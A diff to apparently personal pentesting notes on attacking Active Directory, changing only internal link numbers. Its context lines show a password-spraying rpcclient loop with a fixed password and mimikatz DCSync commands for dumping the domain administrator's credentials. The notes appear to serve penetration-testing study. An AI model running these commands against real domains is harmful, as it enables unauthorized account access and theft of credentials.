@@ -83,7 +83,7 @@ After successfully obtaining usernames that are in use by employees it's possibl
 
 ## Password Spraying
 
-Password Spraying is a technique that consists of sending a single password to multiple of users. This is especially useful after obtaining usernames from the [[0002 Attacking Active Directory#Username Spraying|Username Spraying]] section as it allows us to spray commonly used passwords against valid usernames.
+Password Spraying is a technique that consists of sending a single password to multiple of users. This is especially useful after obtaining usernames from the [[0003 Attacking Active Directory#Username Spraying|Username Spraying]] section as it allows us to spray commonly used passwords against valid usernames.
 
 ```shell title="Password Spray Script"
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
@@ -359,7 +359,7 @@ privilege::debug
 lsadump::dcsync /domain:<DOMAIN-NAME> /user:<DOMAIN>\administrator
 ```
 
-The easiest and quickest way to find users who are misconfigured with the `DS-Replication-Get-Changes-All` is using [[0002 Attacking Active Directory#BloodHound|BloodHound]] as it will visualize all the users who are misconfigured with that permission. Another thing that is important to note is that some passwords inside the Active Directory will be shown in plaintext while doing DCSync attack and that happens because the `Reversible Encryption` is enabled on the account.
+The easiest and quickest way to find users who are misconfigured with the `DS-Replication-Get-Changes-All` is using [[0003 Attacking Active Directory#BloodHound|BloodHound]] as it will visualize all the users who are misconfigured with that permission. Another thing that is important to note is that some passwords inside the Active Directory will be shown in plaintext while doing DCSync attack and that happens because the `Reversible Encryption` is enabled on the account.
 
 ### Group Policy Object Abuse
 
